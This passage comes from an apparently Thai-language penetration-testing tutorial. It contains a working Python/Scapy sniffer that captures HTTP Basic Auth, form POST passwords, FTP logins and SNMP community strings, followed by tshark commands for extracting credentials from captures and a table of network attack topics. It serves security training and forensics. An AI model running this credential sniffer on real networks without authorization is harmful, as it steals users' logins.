            if pkt.haslayer(TCP):
                self.analyze_tcp(pkt, src, dst)
            
            # UDP analysis
            if pkt.haslayer(UDP):
                self.analyze_udp(pkt, src, dst)
        
        # DNS
        if pkt.haslayer(DNS) and pkt[DNS].qr == 0:
            qname = pkt[DNS].qd.qname.decode('utf-8', errors='ignore')
            self.dns_queries.append(qname)
    
    def analyze_tcp(self, pkt, src, dst):
        """Analyze TCP packet for credentials"""
        if not pkt.haslayer(Raw):
            return
        
        data = pkt[Raw].load
        
        # HTTP Basic Auth
        if b'Authorization: Basic' in data:
            import base64
            auth_start = data.find(b'Authorization: Basic ') + 21
            auth_end = data.find(b'\r\n', auth_start)
            auth_b64 = data[auth_start:auth_end]
            try:
                credentials = base64.b64decode(auth_b64).decode()
                self.credentials.append({
                    'type': 'HTTP Basic',
                    'src': src, 'dst': dst,
                    'credentials': credentials
                })
                print(f"[!] HTTP Basic Auth: {credentials}")
            except:
                pass
        
        # HTTP POST with form data
        if b'POST' in data and pkt[TCP].dport == 80:
            for keyword in [b'username=', b'password=', b'passwd=', b'email=']:
                if keyword in data.lower():
                    body_start = data.find(b'\r\n\r\n') + 4
                    body = data[body_start:].decode('utf-8', errors='ignore')
                    self.credentials.append({
                        'type': 'HTTP Form POST',
                        'src': src, 'dst': dst,
                        'data': body[:500]
                    })
                    print(f"[!] HTTP POST credentials: {body[:200]}")
                    break
        
        # FTP credentials
        if pkt[TCP].dport == 21 or pkt[TCP].sport == 21:
            text = data.decode('utf-8', errors='ignore')
            if text.startswith('USER ') or text.startswith('PASS '):
                self.credentials.append({
                    'type': 'FTP',
                    'src': src, 'dst': dst,
                    'data': text.strip()
                })
                print(f"[!] FTP: {text.strip()}")
    
    def analyze_udp(self, pkt, src, dst):
        """Analyze UDP packet"""
        # SNMP community strings
        if pkt.haslayer(SNMP):
            community = pkt[SNMP].community.decode('utf-8', errors='ignore')
            print(f"[!] SNMP Community: {community} ({src} -> {dst})")
    
    def report(self):
        """Print analysis report"""
        print(f"\n{'='*50}")
        print("TRAFFIC ANALYSIS REPORT")
        print(f"{'='*50}")
        print(f"DNS Queries: {len(self.dns_queries)}")
        print(f"Credentials found: {len(self.credentials)}")
        
        if self.credentials:
            print("\n[!] CREDENTIALS:")
            for cred in self.credentials:
                print(f"  Type: {cred['type']}")
                print(f"  {cred.get('credentials', cred.get('data', 'N/A'))}")
        
        print("\n[*] Top 10 DNS Queries:")
        dns_counter = collections.Counter(self.dns_queries)
        for domain, count in dns_counter.most_common(10):
            print(f"  {count:4d}x {domain}")

# Usage
if __name__ == '__main__':
    analyzer = TrafficAnalyzer()
    
    import sys
    if len(sys.argv) > 1:
        analyzer.analyze_pcap(sys.argv[1])
    else:
        # Live capture
        print("[*] Live capture mode (Ctrl+C to stop)")
        sniff(
            filter="tcp or udp or dns",
            prn=analyzer.process_packet,
            store=False
        )
```

### 170.2 Network Forensics with Wireshark

```bash
# Wireshark command-line analysis (tshark)

# ดู HTTP requests
tshark -r capture.pcap -Y 'http.request' \
    -T fields -e ip.src -e http.host -e http.request.uri

# ดู DNS queries
tshark -r capture.pcap -Y 'dns.flags.response == 0' \
    -T fields -e ip.src -e dns.qry.name

# Extract files from HTTP
tshark -r capture.pcap --export-objects http,/tmp/http_files/

# Extract credentials from FTP
tshark -r capture.pcap -Y 'ftp' \
    -T fields -e ip.src -e ftp.request.command -e ftp.request.arg

# Find cleartext passwords
tshark -r capture.pcap -Y 'http.request.method == POST' \
    -T fields -e ip.src -e ip.dst -e http.file_data | grep -i 'pass\|login'

# Detect port scans (SYN without ACK)
tshark -r capture.pcap -Y 'tcp.flags.syn==1 and tcp.flags.ack==0' \
    -T fields -e ip.src -e ip.dst -e tcp.dstport | sort | uniq -c | sort -rn

# Network statistics
tshark -r capture.pcap -q -z io,phs         # Protocol hierarchy
tshark -r capture.pcap -q -z endpoints,ip   # IP endpoints
tshark -r capture.pcap -q -z conversations,tcp  # TCP conversations

# Merge multiple captures
mergecap -w merged.pcap capture1.pcap capture2.pcap

# Filter and export
tshark -r capture.pcap -Y 'ip.src == 192.168.1.100' -w filtered.pcap
```

---

## สรุป Part 17

| ขั้นตอน | หัวข้อ | เครื่องมือ/เทคนิค |
|---------|--------|------------------|
| 161 | MITM Attacks | arpspoof, bettercap, Scapy ARP spoofing |
| 162 | SSL/TLS Attacks | SSLstrip, testssl.sh, TLS analyzer |
| 163 | DNS Attacks | DNS spoofing, Zone transfer, DNS rebinding |
| 164 | DHCP Attacks | DHCP starvation, Rogue DHCP server |
| 165 | Wireless Attacks | WPA2 cracking, Evil Twin, WPS attack |
| 166 | VPN & Tunneling | SSH tunneling, chisel, HTTP tunneling |
| 167 | SMB Attacks | EternalBlue, SMB relay, Pass-the-Hash |
| 168 | IPv6 Attacks | RA spoofing, mitm6, NDP attacks |
| 169 | ICS/SCADA | Modbus, S7, DNP3 scanning |
| 170 | Traffic Analysis | Scapy, tshark, credential extraction |

---
*Part 17 ครอบคลุม Steps 161-170 | ใช้ใน authorized lab environment เท่านั้น*
